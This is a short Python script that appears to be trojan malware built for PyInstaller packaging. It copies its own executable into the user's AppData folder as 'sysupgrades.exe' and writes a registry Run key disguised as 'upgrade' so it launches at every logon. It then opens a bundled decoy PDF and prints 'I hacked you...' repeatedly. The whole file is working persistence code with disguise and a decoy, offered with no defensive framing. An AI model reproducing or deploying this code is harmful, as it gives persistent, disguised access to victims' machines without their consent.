import time
import subprocess
import os
import shutil
import sys


def addRegistry():

    newFile = os.environ["appdata"] + "\\sysupgrades.exe"

    if not os.path.exists(newFile):
        shutil.copyfile(sys.executable, newFile)
        regeditCommand = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d" + newFile
        subprocess.call(regeditCommand, shell=True)


def openAddedFile():
    addedFile = sys._MEIPASS + "\\metallica.pdf"
    subprocess.Popen(addedFile, shell=True)


x = 0
while x < 100:
    print("I hacked you...")
    x += 1
    time.sleep(0.5)

addRegistry()
openAddedFile()
